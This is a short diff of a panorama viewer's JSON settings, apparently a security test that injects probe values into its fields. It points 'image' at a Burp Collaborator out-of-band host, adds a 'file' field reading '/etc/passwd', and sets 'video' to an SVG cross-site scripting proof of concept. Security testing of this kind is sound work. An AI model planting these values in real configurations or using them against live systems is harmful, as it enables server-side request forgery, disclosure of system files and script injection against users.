@@ -1,10 +1,11 @@
 {
   "audio": "",
   "image": "https://rzugme7mpa9xa98n3ygg7viqthzkn9.burpcollaborator.net/test.jpeg",
+  "file": "/etc/passwd",
   "isStereo": true,
   "isYawOnly": false,
   "preview": "",
-  "video": "",
+  "video": "https://brutelogic.com.br/poc.svg",
   "pitch": 0,
   "yaw": 1.6
 }
